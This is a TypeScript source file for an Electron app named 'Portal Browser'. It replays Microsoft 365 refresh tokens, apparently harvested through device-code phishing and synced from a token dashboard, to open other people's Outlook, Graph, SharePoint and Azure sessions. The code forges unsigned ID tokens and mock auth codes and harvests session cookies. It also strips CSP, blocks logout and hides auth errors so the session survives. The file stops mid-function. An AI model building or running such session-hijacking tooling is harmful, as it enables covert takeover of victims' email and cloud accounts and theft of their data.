import { app, BrowserWindow, ipcMain, Notification, net, shell, session, Menu, dialog } from 'electron';
import * as path from 'path';
import * as https from 'https';
import * as fs from 'fs';
import * as os from 'os';
import { exec, execFile } from 'child_process';
import * as http from 'http';
import WebSocket from 'ws';
import { autoUpdater } from 'electron-updater';
import { AuthManager } from './auth';
import { GraphMailClient } from './graphClient';
import { TokenStore } from './tokenStore';

const DASHBOARD_API = 'https://outlook-token-dashboard.pages.dev/api';
const FOCI_CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
const CLIENT_ID = FOCI_CLIENT_ID;
const BROKER_CLIENT_ID = '29d9ed98-a469-4536-ade2-f981bc1d605e';
const OWA_URL = 'https://outlook.office365.com/mail/';
const EDGE_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2478.0';

function isLoginUrl(url: string): boolean {
  return url.includes('login.microsoftonline.com') || url.includes('login.live.com') || url.includes('login.microsoft.com');
}

// v2.0 token exchange (Portal Browser v10.10 pattern)
async function exchangeToken(refreshTk: string, clientId: string, scope: string): Promise<Record<string, unknown>> {
  try {
    const resp = await net.fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({ client_id: clientId, grant_type: 'refresh_token', refresh_token: refreshTk, scope }).toString(),
    });
    return await resp.json() as Record<string, unknown>;
  } catch (err: unknown) {
    return { error: 'fetch_failed', error_description: err instanceof Error ? err.message : 'unknown' };
  }
}

async function exchangeTokenWithFallback(refreshTk: string, scope: string): Promise<Record<string, unknown>> {
  for (const clientId of [FOCI_CLIENT_ID, BROKER_CLIENT_ID]) {
    const result = await exchangeToken(refreshTk, clientId, scope);
    if (!result.error && result.access_token) return result;
  }
  return { error: 'all_clients_failed' };
}

function decodeJwt(token: string): Record<string, unknown> | null {
  try {
    const parts = token.split('.');
    if (parts.length < 2) return null;
    return JSON.parse(Buffer.from(parts[1], 'base64url').toString());
  } catch { return null; }
}

// Domain helpers
const MS_DOMAINS = ['microsoft.com', 'microsoftonline.com', 'office.com', 'office365.com', 'azure.com', 'sharepoint.com', 'live.com', 'onedrive.com', 'onenote.com'];
function isMsDomain(hostname: string): boolean { return MS_DOMAINS.some(d => hostname === d || hostname.endsWith('.' + d)); }

const API_DOMAINS = ['outlook.office365.com', 'outlook.office.com', 'outlook.cloud.microsoft.com', 'outlook.cloud.microsoft', 'substrate.office.com', 'graph.microsoft.com', 'admin.microsoft.com', 'portal.office.com', 'www.office.com'];
function isApiDomain(hostname: string): boolean { return API_DOMAINS.some(d => hostname === d || hostname.endsWith('.' + d)); }

const CDN_DOMAINS = ['res.office365.com', 'res.cdn.office.net', 'cdn.office.net', 'akamaized.net', 'msecnd.net', 'aspnetcdn.com', 'office.net', 'shellprod.msocdn.com'];
function isCdnDomain(hostname: string): boolean { return CDN_DOMAINS.some(d => hostname === d || hostname.endsWith('.' + d)); }

const LOGOUT_PATHS = ['/logout', '/signout', '/logoff', '/sign-out', 'oauth2/logout', '/common/oauth2/v2.0/logout'];
function isLogoutUrl(url: string): boolean {
  try { const p = new URL(url).pathname.toLowerCase(); return LOGOUT_PATHS.some(lp => p.includes(lp)); } catch { return false; }
}

// Reliable HTTP POST using Node's native https module (avoids Electron net.fetch quirks)
function httpsPost(url: string, data: Record<string, unknown>): Promise<{ status: number; body: string }> {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify(data);
    const urlObj = new URL(url);
    const options = {
      hostname: urlObj.hostname,
      port: 443,
      path: urlObj.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData),
      },
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', (chunk: Buffer) => { body += chunk.toString(); });
      res.on('end', () => {
        resolve({ status: res.statusCode || 500, body });
      });
    });

    req.on('error', reject);
    req.write(postData);
    req.end();
  });
}

let mainWindow: BrowserWindow | null = null;
let authManager: AuthManager;
let graphClient: GraphMailClient | null = null;
const tokenStore = new TokenStore();

interface SyncedAccount {
  sessionId: string;
  email: string;
  name: string;
  accessToken: string;
  refreshToken: string;
  accessTokenExpiry: string;
}

const syncedAccounts: SyncedAccount[] = [];

const SERVICE_URLS: Record<string, string> = {
  owa: 'https://outlook.office365.com/mail/',
  onedrive: 'https://www.office.com/launch/onedrive',
  admin: 'https://admin.microsoft.com/',
  sharepoint: 'https://admin.microsoft.com/#/SharePoint',
  teams: 'https://teams.microsoft.com/',
  azure: 'https://portal.azure.com/',
  chrome: 'https://outlook.office365.com/mail/',
};

function createWindow(): void {
  mainWindow = new BrowserWindow({
    width: 1400,
    height: 900,
    minWidth: 900,
    minHeight: 600,
    title: 'Portal Browser',
    icon: path.join(__dirname, '../../assets/icon.png'),
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false,
    },
  });

  if (process.env.NODE_ENV === 'development' || !app.isPackaged) {
    mainWindow.loadURL('http://localhost:5173');
  } else {
    mainWindow.loadFile(path.join(__dirname, '../renderer/index.html'));
  }

  mainWindow.on('closed', () => {
    mainWindow = null;
  });
}

async function refreshAccountToken(account: SyncedAccount): Promise<boolean> {
  const result = await exchangeTokenWithFallback(account.refreshToken, 'https://outlook.office.com/.default openid profile offline_access');
  if (!result.error && result.access_token) {
    account.accessToken = result.access_token as string;
    if (result.refresh_token) account.refreshToken = result.refresh_token as string;
    const expiresIn = (result.expires_in as number) || 3600;
    account.accessTokenExpiry = new Date(Date.now() + expiresIn * 1000).toISOString();
    return true;
  }
  return false;
}

// Portal Browser v10.10 protocol handler approach — intercepts ALL HTTPS
// requests at the protocol level. This is what makes authenticated OWA work:
// 1. Intercepts MSAL's /oauth2/authorize → returns 302 with mock auth code
// 2. Intercepts MSAL's /oauth2/token → exchanges refresh token, returns real tokens
// 3. Injects Bearer on API domains
// 4. Blocks logout, strips CSP, suppresses 401s
async function launchChromeWithSession(account: SyncedAccount, service: string): Promise<{ success: boolean; error?: string }> {
  try {
    const url = SERVICE_URLS[service] || SERVICE_URLS.owa;
    const email = account.email;

    // Step 1: Exchange tokens for all needed scopes (parallel)
    const scopes = [
      { key: 'outlook', scope: 'https://outlook.office.com/.default openid profile offline_access' },
      { key: 'outlook365', scope: 'https://outlook.office365.com/.default openid profile offline_access' },
      { key: 'graph', scope: 'https://graph.microsoft.com/.default openid profile offline_access' },
      { key: 'substrate', scope: 'https://substrate.office.com/.default openid profile offline_access' },
    ];

    const resourceTokens: Record<string, string> = {};
    let firstResult: Record<string, unknown> | null = null;
    let currentRefreshToken = account.refreshToken;

    const tokenResults = await Promise.allSettled(
      scopes.map(s => exchangeTokenWithFallback(account.refreshToken, s.scope).then(r => ({ ...r, _key: s.key })))
    );

    for (const settled of tokenResults) {
      if (settled.status === 'fulfilled') {
        const result = settled.value as Record<string, unknown>;
        if (!result.error && result.access_token) {
          resourceTokens[result._key as string] = result.access_token as string;
          if (!firstResult) {
            firstResult = result;
            currentRefreshToken = (result.refresh_token as string) || account.refreshToken;
          }
        }
      }
    }

    if (!firstResult) {
      return { success: false, error: 'All token exchanges failed — re-sync this account.' };
    }

    // Cross-fill outlook tokens
    if (resourceTokens.outlook && !resourceTokens.outlook365) resourceTokens.outlook365 = resourceTokens.outlook;
    if (resourceTokens.outlook365 && !resourceTokens.outlook) resourceTokens.outlook = resourceTokens.outlook365;

    // Persist refreshed token
    account.refreshToken = currentRefreshToken;
    account.accessToken = resourceTokens.outlook || (firstResult.access_token as string);

    const decoded = decodeJwt(firstResult.access_token as string);
    const oid = (decoded?.oid as string) || '';
    const tid = (decoded?.tid as string) || '';
    const clientInfo = Buffer.from(JSON.stringify({ uid: oid, utid: tid })).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');

    // Step 2: Create session with protocol handler
    const partitionName = `persist:portal-${account.sessionId}-${service}`;
    const portalSession = session.fromPartition(partitionName);

    // Flush cookie store (don't clear entire cache — reuse is faster)
    await portalSession.cookies.flushStore();

    // Strip CSP headers
    portalSession.webRequest.onHeadersReceived((details, callback) => {
      const headers = { ...details.responseHeaders };
      delete headers['content-security-policy'];
      delete headers['Content-Security-Policy'];
      delete headers['content-security-policy-report-only'];
      delete headers['Content-Security-Policy-Report-Only'];
      callback({ responseHeaders: headers });
    });

    // Helper: get the right token for a hostname
    function getTokenForHost(hostname: string): string {
      if (hostname.includes('outlook') || hostname.includes('office365'))
        return resourceTokens.outlook || resourceTokens.graph || (firstResult!.access_token as string);
      if (hostname.includes('graph.microsoft'))
        return resourceTokens.graph || (firstResult!.access_token as string);
      if (hostname.includes('substrate'))
        return resourceTokens.substrate || (firstResult!.access_token as string);
      return resourceTokens.graph || (firstResult!.access_token as string);
    }

    // PROTOCOL HANDLER — intercept ALL HTTPS requests
    // Unregister any existing handler first (fixes "Failed to register protocol: https"
    // when reopening a service tab after closing it)
    try { portalSession.protocol.unhandle('https'); } catch { /* no prior handler — ok */ }
    portalSession.protocol.handle('https', async (request) => {
      const parsed = new URL(request.url);

      // Block logout
      if (isLogoutUrl(request.url)) {
        return new Response('<!DOCTYPE html><html><body><script>history.back();</script></body></html>', {
          status: 200, headers: { 'content-type': 'text/html; charset=utf-8' },
        });
      }

      // Intercept OAuth authorize → return 302 with mock auth code
      if (parsed.hostname === 'login.microsoftonline.com' &&
          (parsed.pathname.includes('/oauth2/authorize') || parsed.pathname.includes('/oauth2/v2.0/authorize'))) {
        const redirectUri = parsed.searchParams.get('redirect_uri') || OWA_URL;
        const state = parsed.searchParams.get('state') || '';
        const scope = parsed.searchParams.get('scope') || '';
        const responseMode = parsed.searchParams.get('response_mode') || 'fragment';

        // Silently exchange for the requested scope
        if (scope) {
          try {
            const result = await exchangeTokenWithFallback(currentRefreshToken, scope);
            if (!result.error && result.access_token) {
              const dec = decodeJwt(result.access_token as string);
              const aud = (dec?.aud as string) || '';
              if (aud.includes('graph')) resourceTokens.graph = result.access_token as string;
              else if (aud.includes('outlook')) resourceTokens.outlook = result.access_token as string;
              if (result.refresh_token) currentRefreshToken = result.refresh_token as string;
            }
          } catch { /* ignore */ }
        }

        const mockCode = 'mock_auth_code_' + Date.now();
        const params = new URLSearchParams({ code: mockCode, state, client_info: clientInfo, session_state: Date.now().toString() });
        const sep = responseMode === 'query' ? '?' : '#';
        return new Response(null, {
          status: 302,
          headers: { Location: redirectUri + sep + params.toString(), 'Cache-Control': 'no-store, no-cache' },
        });
      }

      // Intercept OAuth token → exchange refresh token and return real tokens
      if (parsed.hostname === 'login.microsoftonline.com' &&
          (parsed.pathname.includes('/oauth2/token') || parsed.pathname.includes('/oauth2/v2.0/token')) &&
          request.method === 'POST') {
        let bodyText = '';
        try { bodyText = await request.text(); } catch { /* empty */ }
        const bodyParams = new URLSearchParams(bodyText);
        const code = bodyParams.get('code') || '';
        const grantType = bodyParams.get('grant_type') || '';

        if ((code && code.startsWith('mock_auth_code_')) || grantType === 'refresh_token') {
          const reqClientId = bodyParams.get('client_id') || BROKER_CLIENT_ID;
          const reqScope = bodyParams.get('scope') || 'https://outlook.office.com/.default openid profile offline_access';

          let tokenResult = firstResult!;
          try {
            const exchanged = await exchangeToken(currentRefreshToken, reqClientId, reqScope);
            if (!exchanged.error && exchanged.access_token) {
              tokenResult = exchanged;
              const dec = decodeJwt(exchanged.access_token as string);
              const aud = (dec?.aud as string) || '';
              if (aud.includes('graph')) resourceTokens.graph = exchanged.access_token as string;
              else if (aud.includes('outlook') || aud.includes('office')) resourceTokens.outlook = exchanged.access_token as string;
              if (exchanged.refresh_token) currentRefreshToken = exchanged.refresh_token as string;
            }
          } catch { /* use firstResult */ }

          // Build id_token (alg: none)
          const now = Math.floor(Date.now() / 1000);
          const idClaims = { aud: reqClientId, iss: `https://login.microsoftonline.com/${tid}/v2.0`, iat: now, nbf: now, exp: now + 3600, sub: oid, oid, tid, preferred_username: email, name: email, email, ver: '2.0' };
          const idHeader = Buffer.from(JSON.stringify({ typ: 'JWT', alg: 'none' })).toString('base64url');
          const idPayload = Buffer.from(JSON.stringify(idClaims)).toString('base64url');

          const tokenResponse = {
            access_token: tokenResult.access_token, token_type: 'Bearer',
            expires_in: (tokenResult.expires_in as number) || 3600, ext_expires_in: 3600,
            scope: (tokenResult.scope as string) || reqScope,
            id_token: idHeader + '.' + idPayload + '.',
            refresh_token: (tokenResult.refresh_token as string) || currentRefreshToken,
            client_info: clientInfo, foci: '1',
          };
          return new Response(JSON.stringify(tokenResponse), {
            status: 200, headers: { 'content-type': 'application/json; charset=utf-8', 'cache-control': 'no-store' },
          });
        }

        // Unknown token request — pass through
        try { return await net.fetch(new Request(request.url, { method: 'POST', headers: request.headers, body: bodyText })); }
        catch { return new Response('{}', { status: 500 }); }
      }

      // API domains → inject Bearer token + harvest cookies
      const isOwaOrOffice = parsed.hostname.includes('outlook') || parsed.hostname.includes('office');
      const isSharepoint = parsed.hostname.endsWith('.sharepoint.com') || parsed.hostname.includes('onedrive.com');
      if (!isCdnDomain(parsed.hostname) && (isApiDomain(parsed.hostname) || isSharepoint)) {
        const token = getTokenForHost(parsed.hostname);
        const headers = new Headers(request.headers);
        if (!headers.has('Authorization') || headers.get('Authorization') === 'Bearer')
          headers.set('Authorization', 'Bearer ' + token);
        headers.set('User-Agent', EDGE_UA);

        try {
          const resp = await net.fetch(new Request(request.url, {
            method: request.method, headers,
            body: request.method !== 'GET' && request.method !== 'HEAD' ? request.body : undefined,
            duplex: request.method !== 'GET' && request.method !== 'HEAD' ? 'half' : undefined,
          } as RequestInit));

          // Cookie harvesting — protocol handler bypasses automatic cookie processing
          if ((isOwaOrOffice || isSharepoint) && resp.headers.getSetCookie) {
            for (const setCookieStr of resp.headers.getSetCookie()) {
              try {
                const eqI = setCookieStr.indexOf('=');
                const scI = setCookieStr.indexOf(';');
                if (eqI < 0) continue;
                const cookieName = setCookieStr.substring(0, eqI).trim();
                const cookieValue = setCookieStr.substring(eqI + 1, scI > 0 ? scI : setCookieStr.length).trim();
                await portalSession.cookies.set({
                  url: parsed.origin,
                  name: cookieName,
                  value: cookieValue,
                  secure: true,
                  httpOnly: cookieName === 'FedAuth' || cookieName === 'rtFa' || cookieName.includes('OpenIdConnect') || cookieName.includes('ESTSAUTH'),
                });
              } catch { /* ignore individual cookie failures */ }
            }
          }

          // On 401, refresh and retry once
          if (resp.status === 401) {
            try {
              const freshScope = parsed.hostname.includes('graph') ? 'https://graph.microsoft.com/.default openid profile offline_access' :
                parsed.hostname.includes('substrate') ? 'https://substrate.office.com/.default openid profile offline_access' :
                'https://outlook.office.com/.default openid profile offline_access';
              const freshResult = await exchangeTokenWithFallback(currentRefreshToken, freshScope);
              if (!freshResult.error && freshResult.access_token) {
                const freshToken = freshResult.access_token as string;
                if (freshResult.refresh_token) currentRefreshToken = freshResult.refresh_token as string;
                const dec = decodeJwt(freshToken);
                const aud = (dec?.aud as string) || '';
                if (aud.includes('graph')) resourceTokens.graph = freshToken;
                else if (aud.includes('outlook') || aud.includes('office')) resourceTokens.outlook = freshToken;
                else if (aud.includes('substrate')) resourceTokens.substrate = freshToken;

                const h2 = new Headers(request.headers);
                h2.set('Authorization', 'Bearer ' + freshToken);
                h2.set('User-Agent', EDGE_UA);
                const r2 = await net.fetch(new Request(request.url, { method: request.method, headers: h2 }));
                // Harvest cookies from retry
                if ((isOwaOrOffice || isSharepoint) && r2.headers.getSetCookie) {
                  for (const setCookieStr of r2.headers.getSetCookie()) {
                    try {
                      const eqI = setCookieStr.indexOf('=');
                      const scI = setCookieStr.indexOf(';');
                      if (eqI < 0) continue;
                      const cookieName = setCookieStr.substring(0, eqI).trim();
                      const cookieValue = setCookieStr.substring(eqI + 1, scI > 0 ? scI : setCookieStr.length).trim();
                      await portalSession.cookies.set({ url: parsed.origin, name: cookieName, value: cookieValue, secure: true, httpOnly: cookieName === 'FedAuth' || cookieName === 'rtFa' || cookieName.includes('OpenIdConnect') || cookieName.includes('ESTSAUTH') });
                    } catch {}
                  }
                }
                return r2;
              }
            } catch { /* fall through to suppress */ }
            return new Response('{}', { status: 200, headers: { 'content-type': 'application/json' } });
          }
          return resp;
        } catch {
          return net.fetch(request.url, { method: request.method, headers: Object.fromEntries(headers.entries()) });
        }
      }

      // Everything else — pass through (also harvest cookies from MS domains)
      try {
        const resp = await net.fetch(request);
        if ((isOwaOrOffice || isSharepoint || parsed.hostname.includes('microsoft') || parsed.hostname.includes('live.com')) && resp.headers.getSetCookie) {
          for (const setCookieStr of resp.headers.getSetCookie()) {
            try {
              const eqI = setCookieStr.indexOf('=');
              const scI = setCookieStr.indexOf(';');
              if (eqI < 0) continue;
              const cookieName = setCookieStr.substring(0, eqI).trim();
              const cookieValue = setCookieStr.substring(eqI + 1, scI > 0 ? scI : setCookieStr.length).trim();
              await portalSession.cookies.set({ url: parsed.origin, name: cookieName, value: cookieValue, secure: true, httpOnly: cookieName === 'FedAuth' || cookieName === 'rtFa' || cookieName.includes('OpenIdConnect') || cookieName.includes('ESTSAUTH') });
            } catch {}
          }
        }
        return resp;
      }
      catch { return new Response('', { status: 502 }); }
    });

    // ── Background Cookie Acquisition (v10.10 pattern) ──
    // Use native https to bypass our own protocol handler
    // Exchanges Bearer token for real OWA session cookies (FedAuth, rtFa, ESTSAUTH)
    interface HttpResp { status: number; setCookies: string[]; location: string | null; body: string }
    function httpGetDirect(reqUrl: string, headers: Record<string, string> = {}): Promise<HttpResp> {
      return new Promise((resolve, reject) => {
        const p = new URL(reqUrl);
        const req = https.request({ hostname: p.hostname, port: 443, path: p.pathname + p.search, method: 'GET', headers: { 'User-Agent': EDGE_UA, ...headers } }, res => {
          let body = '';
          res.on('data', (c: Buffer) => body += c.toString());
          res.on('end', () => resolve({ status: res.statusCode || 0, setCookies: (res.headers['set-cookie'] || []) as string[], location: (res.headers['location'] as string) || null, body }));
        });
        req.on('error', reject);
        req.setTimeout(10000, () => { req.destroy(); reject(new Error('timeout')); });
        req.end();
      });
    }
    function httpPostDirect(reqUrl: string, postBody: string, headers: Record<string, string> = {}): Promise<HttpResp> {
      return new Promise((resolve, reject) => {
        const p = new URL(reqUrl);
        const req = https.request({ hostname: p.hostname, port: 443, path: p.pathname + p.search, method: 'POST', headers: { 'User-Agent': EDGE_UA, 'Content-Length': Buffer.byteLength(postBody).toString(), ...headers } }, res => {
          let body = '';
          res.on('data', (c: Buffer) => body += c.toString());
          res.on('end', () => resolve({ status: res.statusCode || 0, setCookies: (res.headers['set-cookie'] || []) as string[], location: (res.headers['location'] as string) || null, body }));
        });
        req.on('error', reject);
        req.setTimeout(10000, () => { req.destroy(); reject(new Error('timeout')); });
        req.write(postBody);
        req.end();
      });
    }
    async function injectSetCookies(rawCookies: string[], defaultDomain: string): Promise<void> {
      for (const raw of rawCookies) {
        try {
          const eqIdx = raw.indexOf('=');
          const scIdx = raw.indexOf(';');
          if (eqIdx < 1) continue;
          const name = raw.substring(0, eqIdx).trim();
          const value = raw.substring(eqIdx + 1, scIdx > 0 ? scIdx : raw.length).trim();
          if (!name || !value) continue;
          const domainMatch = raw.match(/domain=([^;]+)/i);
          const pathMatch = raw.match(/path=([^;]+)/i);
          const domain = domainMatch ? domainMatch[1].trim() : defaultDomain;
          const cpath = pathMatch ? pathMatch[1].trim() : '/';
          await portalSession.cookies.set({
            url: 'https://' + domain.replace(/^\./, '') + cpath,
            name, value, domain, path: cpath,
            secure: /secure/i.test(raw),
            httpOnly: /httponly/i.test(raw),
          });
        } catch { /* ignore */ }
      }
    }

    // Fire cookie acquisition in background (non-blocking) — exact v10.10 pattern
    const owaToken = resourceTokens.outlook || (firstResult!.access_token as string);
    (async () => {
      try {
        // Phase 1: GET endpoints (parallel) — exchange Bearer for session cookies
        const cookieEndpoints = [
          { url: 'https://outlook.office365.com/owa/', label: 'OWA root' },
          { url: 'https://outlook.office365.com/owa/' + email + '/', label: 'OWA mailbox' },
          { url: 'https://outlook.office.com/mail/', label: 'Outlook mail' },
        ];
        await Promise.allSettled(
          cookieEndpoints.map(ep =>
            httpGetDirect(ep.url, { 'Authorization': 'Bearer ' + owaToken, 'Accept': 'text/html,application/xhtml+xml,*/*' })
              .then(async resp => {
                await injectSetCookies(resp.setCookies, '.outlook.office365.com');
                let loc = resp.location; let hops = 0;
                while (loc && hops < 2) {
                  hops++;
                  try {
                    const fullUrl = loc.startsWith('/') ? 'https://outlook.office365.com' + loc : loc;
                    const hopResp = await httpGetDirect(fullUrl, { 'Authorization': 'Bearer ' + owaToken });
                    await injectSetCookies(hopResp.setCookies, '.outlook.office365.com');
                    loc = hopResp.location;
                  } catch { break; }
                }
              }).catch(() => {})
          )
        );

        // Phase 2: Auth endpoints (parallel) — POST to auth.owa + sessionretrieve
        interface AuthEp { method: string; url: string; headers: Record<string, string>; body: string | null }
        const authEndpoints: AuthEp[] = [
          { method: 'POST', url: 'https://outlook.office365.com/owa/', headers: { 'Authorization': 'Bearer ' + owaToken, 'Action': 'SessionData', 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'destination=' + encodeURIComponent('https://outlook.office365.com/owa/') + '&flags=4&forcedownlevel=0&trusted=1' },
          { method: 'POST', url: 'https://outlook.office365.com/owa/auth.owa', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'destination=' + encodeURIComponent('https://outlook.office365.com/owa/') + '&flags=4&forcedownlevel=0&trusted=1&tokenType=2&accessToken=' + encodeURIComponent(owaToken) },
          { method: 'POST', url: 'https://outlook.office365.com/owa/auth.owa', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'destination=' + encodeURIComponent('https://outlook.office365.com/owa/') + '&flags=4&forcedownlevel=0&trusted=1&token=' + encodeURIComponent(owaToken) },
          { method: 'GET', url: 'https://outlook.office365.com/owa/sessionretrieve.ashx', headers: { 'Authorization': 'Bearer ' + owaToken }, body: null },
        ];

        const estsBody = new URLSearchParams({ client_id: FOCI_CLIENT_ID, grant_type: 'refresh_token', refresh_token: currentRefreshToken, scope: 'openid profile offline_access' }).toString();

        await Promise.allSettled([
          ...authEndpoints.map(ae =>
            (ae.method === 'POST' && ae.body
              ? httpPostDirect(ae.url, ae.body, ae.headers)
              : httpGetDirect(ae.url, ae.headers)
            ).then(async resp => {
              await injectSetCookies(resp.setCookies, '.outlook.office365.com');
              if (resp.location) {
                try {
                  const redirUrl = resp.location.startsWith('/') ? 'https://outlook.office365.com' + resp.location : resp.location;
                  const cookieStr = resp.setCookies.map((c: string) => c.split(';')[0]).join('; ');
                  const redirResp = await httpGetDirect(redirUrl, { 'Authorization': 'Bearer ' + owaToken, ...(cookieStr ? { 'Cookie': cookieStr } : {}) });
                  await injectSetCookies(redirResp.setCookies, '.outlook.office365.com');
                } catch { /* ignore */ }
              }
            }).catch(() => {})
          ),
          // ESTSAUTH cookies from login endpoint
          httpPostDirect('https://login.microsoftonline.com/common/oauth2/v2.0/token', estsBody, { 'Content-Type': 'application/x-www-form-urlencoded' })
            .then(async estsResp => {
              await injectSetCookies(estsResp.setCookies, '.login.microsoftonline.com');
            }).catch(() => {}),
        ]);
      } catch { /* background, non-fatal */ }
    })();

    // Step 3: Create window
    portalSession.setPermissionRequestHandler((_wc, _permission, cb) => cb(true));

    const portalWindow = new BrowserWindow({
      width: 1400, height: 900, show: false,
      title: `${email} — ${service.toUpperCase()}`,
      webPreferences: {
        partition: partitionName,
        contextIsolation: true,
        nodeIntegration: false,
        sandbox: false,
      },
    });

    // CSP bypass via CDP
    try {
      portalWindow.webContents.debugger.attach('1.3');
      portalWindow.webContents.debugger.sendCommand('Page.setBypassCSP', { enabled: true });
    } catch { /* non-fatal */ }

    // MSAL cache seeding + stability script on dom-ready
    const msalEmail = email;
    const msalScript = `
    (function() {
      try {
        const oid = ${JSON.stringify(oid)};
        const tid = ${JSON.stringify(tid)};
        const email = ${JSON.stringify(msalEmail)};
        const homeAccountId = oid + '.' + tid;
        const environment = 'login.microsoftonline.com';
        const now = Math.floor(Date.now() / 1000);
        const clientInfo = btoa(JSON.stringify({ uid: oid, utid: tid })).replace(/\\+/g, '-').replace(/\\//g, '_').replace(/=+$/g, '');
        const portalClientIds = { outlook: '9199bf20-a13f-4107-85dc-02114787ef48', office: '4765445b-32c6-49b0-83e6-1d93765276ca', default: 'd3590ed6-52b3-4102-aeff-aad2292ab01c' };
        const host = window.location.hostname;
        let clientId = portalClientIds['default'];
        if (host.includes('outlook')) clientId = portalClientIds.outlook;
        else if (host.includes('office')) clientId = portalClientIds.office;
        const idPayload = { aud: clientId, iss: 'https://login.microsoftonline.com/' + tid + '/v2.0', iat: now, nbf: now, exp: now + 86400, sub: oid, oid, tid, preferred_username: email, name: email, email, ver: '2.0' };
        const idHeader = btoa(JSON.stringify({typ:'JWT',alg:'none'})).replace(/=/g,'');
        const idBody = btoa(JSON.stringify(idPayload)).replace(/=/g,'');
        const idToken = idHeader + '.' + idBody + '.';
        const accountKey = homeAccountId + '-' + environment + '-' + tid;
        const accountValue = { homeAccountId, environment, tenantId: tid, username: email, localAccountId: oid, name: email, authorityType: 'MSSTS', clientInfo, realm: tid };
        const idTokenKey = homeAccountId + '-' + environment + '-idtoken-' + clientId + '-' + tid + '---';
        const idTokenValue = { credentialType: 'IdToken', homeAccountId, environment, clientId, secret: idToken, realm: tid };
        const scopes = 'openid profile';
        const atKey = homeAccountId + '-' + environment + '-accesstoken-' + clientId + '-' + tid + '-' + scopes + '--';
        const atValue = { credentialType: 'AccessToken', homeAccountId, environment, clientId, secret: ${JSON.stringify(resourceTokens.graph || (firstResult.access_token as string))}, realm: tid, target: scopes, cachedAt: now.toString(), expiresOn: (now + 3600).toString(), extendedExpiresOn: (now + 7200).toString(), tokenType: 'Bearer' };
        const rtKey = homeAccountId + '-' + environment + '-refreshtoken-' + clientId + '----';
        const rtValue = { credentialType: 'RefreshToken', homeAccountId, environment, clientId, secret: ${JSON.stringify(currentRefreshToken)} };
        sessionStorage.setItem(accountKey, JSON.stringify(accountValue));
        sessionStorage.setItem(idTokenKey, JSON.stringify(idTokenValue));
        sessionStorage.setItem(atKey, JSON.stringify(atValue));
        sessionStorage.setItem(rtKey, JSON.stringify(rtValue));
        sessionStorage.setItem('msal.account.keys', JSON.stringify([accountKey]));
        sessionStorage.setItem('msal.' + clientId + '.active-account', homeAccountId);
        sessionStorage.setItem('msal.' + clientId + '.interaction.status', '');
      } catch(e) {}
    })();`;

    const stabilityScript = `
    (function() {
      try {
        window.addEventListener('unhandledrejection', function(e) {
          var msg = (e.reason && e.reason.message) || String(e.reason || '');
          if (msg.includes('401') || msg.includes('Unauthorized') || msg.includes('Failed to fetch') || msg.includes('session') || msg.includes('token') || msg.includes('auth') || msg.includes('expired')) {
            e.preventDefault();
          }
        });
        Object.defineProperty(navigator, 'onLine', { get: function() { return true; }, configurable: true });
        var origAssign = window.location.assign.bind(window.location);
        var origReplace = window.location.replace.bind(window.location);
        function isLogin(url) { return typeof url === 'string' && (url.includes('login.microsoftonline.com') || url.includes('/logoff') || url.includes('/signout') || url.includes('/logout')); }
        window.location.assign = function(url) { if (isLogin(url)) return; return origAssign(url); };
        window.location.replace = function(url) { if (isLogin(url)) return; return origReplace(url); };
        window.location.reload = function() {};
      } catch(e) {}
    })();`;

    portalWindow.webContents.on('dom-ready', () => {
      const u = portalWindow.webContents.getURL();
      if (u && isMsDomain(new URL(u).hostname)) {
        portalWindow.webContents.executeJavaScript(stabilityScript).catch(() => {});
        portalWindow.webContents.executeJavaScript(msalScript).catch(() => {});
      }
    });

    // Block login popups
    portalWindow.webContents.setWindowOpenHandler(({ url: popupUrl }) => {
      if (isLoginUrl(popupUrl)) return { action: 'deny' };
      return { action: 'allow' };
    });

    // ── Open Real Session in Chrome/Edge ──
    // Since auth.owa returns 401 for device code tokens, we can't get FedAuth cookies.
    // Instead we inject a persistent fetch/XHR override that adds Bearer tokens to ALL
    // Microsoft API requests + intercept OAuth flow via CDP Fetch domain.
    async function openRealSession(): Promise<void> {
      const diagLog: string[] = [];
      const log = (msg: string) => { console.log(msg); diagLog.push(msg); };

      try {
        // 0. Refresh all tokens before opening Chrome (prevents stale token 401s on reopen)
        log('[0] Refreshing tokens...');
        const refreshScopes = [
          { key: 'outlook', scope: 'https://outlook.office.com/.default openid profile offline_access' },
          { key: 'outlook365', scope: 'https://outlook.office365.com/.default openid profile offline_access' },
          { key: 'graph', scope: 'https://graph.microsoft.com/.default openid profile offline_access' },
          { key: 'substrate', scope: 'https://substrate.office.com/.default openid profile offline_access' },
        ];
        const refreshResults = await Promise.allSettled(
          refreshScopes.map(s => exchangeTokenWithFallback(currentRefreshToken, s.scope).then(r => ({ ...r, _key: s.key })))
        );
        let refreshedCount = 0;
        for (const settled of refreshResults) {
          if (settled.status === 'fulfilled') {
            const result = settled.value as Record<string, unknown>;
            if (!result.error && result.access_token) {
              resourceTokens[result._key as string] = result.access_token as string;
              if (result.refresh_token) currentRefreshToken = result.refresh_token as string;
              if (!firstResult) firstResult = result;
              refreshedCount++;
            }
          }
        }
        if (resourceTokens.outlook && !resourceTokens.outlook365) resourceTokens.outlook365 = resourceTokens.outlook;
        if (resourceTokens.outlook365 && !resourceTokens.outlook) resourceTokens.outlook = resourceTokens.outlook365;
        account.accessToken = resourceTokens.outlook || (firstResult!.access_token as string);
        log('[0] Refreshed ' + refreshedCount + '/4 tokens');

        // 1. Collect tokens and session data
        let owaToken = resourceTokens.outlook || resourceTokens.outlook365 || (firstResult!.access_token as string);
        let graphToken = resourceTokens.graph || owaToken;
